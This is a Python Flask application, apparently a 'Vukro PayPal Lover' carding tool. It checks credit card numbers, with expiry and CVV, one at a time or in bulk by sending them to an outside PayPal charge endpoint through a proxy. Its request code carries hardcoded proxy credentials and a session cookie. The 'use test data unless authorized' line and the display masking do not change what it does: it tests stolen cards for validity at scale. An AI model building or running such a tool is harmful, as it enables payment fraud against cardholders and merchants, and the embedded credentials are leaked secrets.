from flask import Flask, render_template_string, request, Response, jsonify
import requests, time, re, threading, queue, uuid, json, html

app = Flask(__name__)

# -----------------------------
# Redaction / masking helpers
# -----------------------------
def mask_cc_display(s: str) -> str:
    if not s:
        return s
    if re.match(r'^\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', s.strip()):
        return '[Vukro PayPal Lover'
    def _mask_pan(m):
        digits = re.sub(r'\D', '', m.group(0))
        return '****' + digits[-4:] if 13 <= len(digits) <= 19 else m.group(0)
    return re.sub(r'(?:\d[ -]?){13,19}', _mask_pan, s)

def redact_response_text(text: str) -> str:
    if not isinstance(text, str):
        text = str(text)
    text = re.sub(r'\b\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b', '[REDACTED_CC_BLOCK]', text)
    def _mask(m):
        digits = re.sub(r'\D', '', m.group(0))
        return '****' + digits[-4:] if 13 <= len(digits) <= 19 else m.group(0)
    text = re.sub(r'(?:\d[ -]?){13,19}', _mask, text)
    text = re.sub(r'(CYBORXSESSID=)[^;\s]+', r'\1[REDACTED]', text, flags=re.IGNORECASE)
    return text[:20000]

# -----------------------------
# Extract a short, human message from server response
# -----------------------------
def _clean_message(s: str) -> str:
    s = s.replace('\\n', ' ').replace('\\t', ' ').replace('\\"', '"')
    s = re.sub(r'\s+', ' ', s).strip().strip(' "\'`')
    return s[:240] + ('...' if len(s) > 240 else '')

def extract_main_message(raw_text: str) -> str:
    if not raw_text:
        return ""
    txt = raw_text.strip()

    # Try JSON
    try:
        start, end = txt.find('{'), txt.rfind('}')
        data = json.loads(txt[start:end+1] if start != -1 and end > start else txt)
        for k in ['response','Response','message','Message','msg','Msg','error','Error','detail','Detail']:
            if k in data and data[k]:
                v = data[k]
                if isinstance(v, (list, dict)): v = json.dumps(v)
                return _clean_message(str(v))
        if 'status' in data and isinstance(data['status'], str):
            parts = [str(data.get(k,'')) for k in ['status','Response','response','message','msg','error','detail']]
            return _clean_message(' '.join([p for p in parts if p]))
    except Exception:
        pass

    # Try sentences / quotes
    txt_unesc = html.unescape(txt)
    sentences = re.findall(r'([A-Z][^\.!?]{20,}?[\.!?])', txt_unesc)
    if sentences: return _clean_message(max(sentences, key=len).strip())
    quotes = re.findall(r'"([^"]{20,})"', txt_unesc)
    if quotes: return _clean_message(max(quotes, key=len).strip())

    return _clean_message(txt_unesc.replace('\n',' ')[:240])

# -----------------------------
# In-memory job store for SSE
# -----------------------------
jobs = {}
jobs_lock = threading.Lock()

class MassJob:
    def __init__(self, total):
        self.total = total
        self.done = 0
        self.queue = queue.Queue()
        self.finished = False
    def put(self, event_dict):
        try: self.queue.put_nowait(event_dict)
        except queue.Full: pass

# -----------------------------
# FULL HTML_TEMPLATE
# -----------------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vukro PayPal Lover</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: radial-gradient(circle at top, #0a0f1f, #000); color: #c9d1d9; }
        .card { background: rgba(22,27,34,0.9); border-radius: 18px; box-shadow: 0 0 20px rgba(56,139,253,0.15); }
        .btn-custom { background: #238636; color: white; font-weight: 600; border-radius: 10px; }
        .btn-custom:hover { background: #2ea043; }
        h1 { color: #58a6ff; font-weight: 700; }
        input, textarea { background: #0d1117; color: #c9d1d9; border: 1px solid #30363d; border-radius: 8px; }
        textarea { resize: none; }
        footer { margin-top: 25px; color: #8b949e; font-size: 0.9rem; }
        .small-muted { color:#9aa7bf; font-size:0.9rem; }
        .result-box { background:#07101a; padding:12px; border-radius:8px; color:#e6eef8; white-space:pre-wrap; }
        #log { background:#07101a; padding:12px; border-radius:8px; color:#e6eef8; white-space:pre-wrap; height:260px; overflow:auto; }
        .progress { height: 10px; background:#0d1117; border-radius:8px; }
        .progress-bar { background:#7c3aed; }
    </style>
</head>
<body>
<div class="container mt-5">
    <div class="text-center mb-4">
        <h1>[Vukro PayPal Lover] </h1>
        <p class="small-muted">Enter your data and get instant response from the Vukro Server. Use test data unless you are authorized.</p>
    </div>

    <div class="card p-4 mb-3">
        <form id="form" method="POST" action="/" >
            <div class="mb-3">
                <label class="form-label">Single CC Parameter (example: 4677851519638993|12|2027|055)</label>
                <input type="text" class="form-control" name="cc" placeholder="Enter CC value" autocomplete="off">
            </div>

            <div class="mb-3">
                <label class="form-label">OR — Mass mode: paste multiple payloads (one per line)</label>
                <textarea class="form-control" name="bulk" rows="6" placeholder="xxxxxxxxxxxxxxx|xx|xxxx|xxx"></textarea>
            </div>

            <div class="row g-2 mb-3">
                <div class="col">
                    <label class="form-label">Interval (seconds) between mass requests</label>
                    <input type="number" step="0.1" min="0" class="form-control" name="interval" value="1">
                </div>
                <div class="col">
                    <label class="form-label">Per-request timeout (seconds)</label>
                    <input type="number" step="1" min="1" class="form-control" name="timeout" value="300">
                </div>
            </div>

            <div class="d-grid gap-2">
                <button type="submit" name="action" value="single" class="btn btn-custom">🚀 Check Single</button>
                <button id="massBtn" type="button" class="btn btn-custom" style="background:#6b46c1;">⚡ Mass Send</button>
            </div>
        </form>
    </div>

    <div id="progressArea" class="card p-4 mb-3" style="display:none">
        <h5>🔄 Mass Progress</h5>
        <div class="progress mt-2"><div id="bar" class="progress-bar" role="progressbar" style="width:0%"></div></div>
        <div class="d-flex justify-content-between small-muted mt-2">
            <span id="pct">0%</span><span id="count">0/0</span>
        </div>
        <div class="mt-3"><div id="log"></div></div>
    </div>

    {% if response %}
    <div class="card p-4 mt-4">
        <h5>🧠 Server Response (redacted):</h5>
        <div class="result-box">{{ response }}</div>
    </div>
    {% endif %}

    <footer class="text-center">Made with ❤️ by <strong>Vukro</strong></footer>
</div>

<script>
const form = document.getElementById('form');
const massBtn = document.getElementById('massBtn');
const progressArea = document.getElementById('progressArea');
const bar = document.getElementById('bar');
const pct = document.getElementById('pct');
const count = document.getElementById('count');
const logBox = document.getElementById('log');

massBtn.addEventListener('click', async () => {
  const fd = new FormData(form);
  const payload = new URLSearchParams();
  payload.set('bulk', fd.get('bulk') || '');
  payload.set('cc', fd.get('cc') || '');
  payload.set('interval', fd.get('interval') || '1');
  payload.set('timeout', fd.get('timeout') || '20');

  const resp = await fetch('/start_mass', { method:'POST', body: payload });
  if (!resp.ok) { alert('Failed to start mass job'); return; }
  const data = await resp.json();
  const jobId = data.job_id;

  progressArea.style.display = 'block';
  bar.style.width = '0%'; pct.textContent = '0%'; count.textContent = '0/' + data.total;
  logBox.textContent = '';

  const es = new EventSource('/events/' + jobId);
  es.onmessage = (e) => {
    try {
      const ev = JSON.parse(e.data);
      if (ev.type === 'progress') {
        bar.style.width = ev.percent + '%';
        pct.textContent = ev.percent + '%';
        count.textContent = ev.done + '/' + ev.total;
        if (ev.line) { logBox.textContent += ev.line + "\\n\\n"; logBox.scrollTop = logBox.scrollHeight; }
      } else if (ev.type === 'done') {
        bar.style.width = '100%'; pct.textContent = '100%'; count.textContent = ev.total + '/' + ev.total;
        logBox.textContent += '✅ Completed.'; logBox.scrollTop = logBox.scrollHeight; es.close();
      } else if (ev.type === 'error') {
        logBox.textContent += '❌ ' + (ev.message || 'Error') + "\\n";
      }
    } catch (err) { console.error(err); }
  };
});
</script>
</body>
</html>
"""

# -----------------------------
# Flask Routes
# -----------------------------
@app.route("/", methods=["GET", "POST"])
def home():
    response_text = None
    if request.method == "POST":
        action = request.form.get("action", "single")
        cc_value = (request.form.get("cc") or "").strip()
        interval = float(request.form.get("interval") or 1)
        per_timeout = int(request.form.get("timeout") or 300)

        url = "https://cyborx.net/api/paypal/paypalcharge4.php"
        base_params = {
            "useProxy": "1",
            "hitSender": "both",
            "host": "200.135.35.13",
            "port": "8080",
            "user": "85244",
            "pass": "ulr452"
        }
        headers = {
            "Host": "cyborx.net",
            "Cookie": "CYBORXSESSID=9jDZHmFRXvMhixCa41naTz2ur6pLyMCfNWj29LZxlJ1cZBWT",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/127.0.6533.89 Safari/537.36",
            "Accept": "*/*",
            "Referer": "https://cyborx.net/app/checkers",
            "Accept-Encoding": "gzip, deflate, br"
        }

        if action == "single" and cc_value:
            params = dict(base_params); params["cc"] = cc_value
            try:
                r = requests.get(url, headers=headers, params=params, timeout=per_timeout)
                main = extract_main_message(r.text if isinstance(r.text,str) else str(r.text))
                status_icon = "✅" if r.status_code == 200 else "⚠️" if r.status_code < 500 else "❌"
                response_text = redact_response_text(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{status_icon} SINGLE CHECK RESULT\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📤 Sent: {mask_cc_display(cc_value)}\n💬 Response: {main}\n📊 Status: HTTP {r.status_code}")
            except Exception as e:
                response_text = f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n❌ SINGLE CHECK RESULT\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ ERROR: {str(e)}"

    return render_template_string(HTML_TEMPLATE, response=response_text)

# -------- Mass mode (async with SSE) ----------
def _run_mass(job_id, lines, interval, per_timeout):
    url = "https://cyborx.net/api/paypal/paypalcharge4.php"
    base_params = {
        "useProxy": "1",
        "hitSender": "both",
        "host": "200.135.35.13",
        "port": "8080",
        "user": "85244",
        "pass": "ulr452"
    }
    headers = {
        "Host": "cyborx.net",
        "Cookie": "CYBORXSESSID=9jDZHmFRXvMhixCa41naTz2ur6pLyMCfNWj29LZxlJ1cZBWT",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/127.0.6533.89 Safari/537.36",
        "Accept": "*/*",
        "Referer": "https://cyborx.net/app/checkers",
        "Accept-Encoding": "gzip, deflate, br"
    }

    with jobs_lock:
        job = jobs.get(job_id)

    for idx, payload in enumerate(lines, start=1):
        params = dict(base_params); params["cc"] = payload
        try:
            r = requests.get(url, headers=headers, params=params, timeout=per_timeout)
            main = extract_main_message(r.text if isinstance(r.text,str) else str(r.text))
            status_icon = "✅" if r.status_code == 200 else "⚠️" if r.status_code < 500 else "❌"
            line = f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{status_icon} Request #{idx} of {len(lines)}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📤 Sent: {mask_cc_display(payload)}\n💬 Response: {main}\n📊 Status: HTTP {r.status_code}"
        except Exception as e:
            line = f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n❌ Request #{idx} of {len(lines)}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📤 Sent: {mask_cc_display(payload)}\n⚠️ ERROR: {str(e)}"

        job.done = idx
        job.put({"type": "progress", "done": job.done, "total": job.total,
                 "percent": round(job.done * 100 / job.total, 1), "line": redact_response_text(line)})

        if idx != len(lines) and interval > 0:
            try: time.sleep(interval)
            except Exception: pass

    job.finished = True
    job.put({"type": "done", "total": job.total})

@app.route("/start_mass", methods=["POST"])
def start_mass():
    bulk_raw = (request.form.get("bulk") or "").strip()
    cc_value = (request.form.get("cc") or "").strip()
    interval = float(request.form.get("interval") or 1)
    per_timeout = int(request.form.get("timeout") or 300)

    lines = [ln.strip() for ln in bulk_raw.splitlines() if ln.strip()]
    if not lines and cc_value:
        lines = [cc_value]
    if not lines:
        return jsonify({"error": "No payloads provided"}), 400

    job_id = str(uuid.uuid4())
    job = MassJob(total=len(lines))
    with jobs_lock:
        jobs[job_id] = job

    t = threading.Thread(target=_run_mass, args=(job_id, lines, interval, per_timeout), daemon=True)
    t.start()

    return jsonify({"job_id": job_id, "total": len(lines)}), 200

@app.route("/events/<job_id>")
def events(job_id):
    with jobs_lock:
        job = jobs.get(job_id)
    if not job:
        return "Not found", 404

    def stream():
        yield f"data: {json.dumps({'type':'progress','done':job.done,'total':job.total,'percent':0})}\n\n"
        while True:
            try:
                ev = job.queue.get(timeout=15)
                yield f"data: {json.dumps(ev)}\n\n"
                if ev.get("type") == "done":
                    break
            except queue.Empty:
                yield f"data: {json.dumps({'type':'progress','done':job.done,'total':job.total,'percent':round(job.done*100/job.total,1) if job.total else 0})}\n\n"
                if job.finished:
                    yield f"data: {json.dumps({'type':'done','total':job.total})}\n\n"
                    break
    return Response(stream(), mimetype="text/event-stream")

# -----------------------------
# Run Flask App
# -----------------------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)